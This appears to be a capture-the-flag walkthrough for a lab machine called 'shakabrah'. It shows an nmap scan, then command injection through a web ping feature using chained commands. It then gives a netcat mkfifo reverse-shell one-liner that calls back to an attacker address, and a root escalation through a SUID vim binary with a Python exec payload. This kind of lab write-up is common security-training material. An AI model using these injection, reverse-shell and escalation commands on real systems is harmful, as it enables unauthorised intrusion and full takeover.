@@ -1,0 +1,59 @@
+NMAP SCAN
+=====================
+# nmap -sC -sV 192.168.55.86
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)
+|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)
+|_  256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 00:50:56:BF:26:31 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+PORT 80
+=====================
+There is a functionality to ping a remote host. This is juicy. I will see if we have a callback. Then test a reverse shell
+
+Attack machine : tcpdump -i etho
+Victim machine : ping 192.168.55.200
+
+Chain some commands and see the output.
+Adding a semi colon or && runs both of the commands. Example
+ping 192.168.55.200;ls;id
+
+Now this is good to test reverse shell with.
+We set the rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.55.200 80 >/tmp/f
+On the netcat listener we get the reverse shell
+$ python3 -c 'import pty;pty.spawn("/bin/bash")';
+www-data@shakabrah:/var/www/html$ whoami
+whoami
+www-data
+
+And that way we obtain the user flag.
+
+PTIV ESCALATION
+=====================
+Now the next steps here is to scan the system for any open holes.
+[-] SUID files:
+-rwsr-xr-x 1 root root 2675336 Mar 18  2020 /usr/bin/vim.basic
+
+py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")
+
+reset: unknown terminal type unknown"sh", "-pc", "reset; exec sh -p")
+Terminal type? xterm
+xterm
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+proof.txt
+
+And that way root flag obtained!
+
+
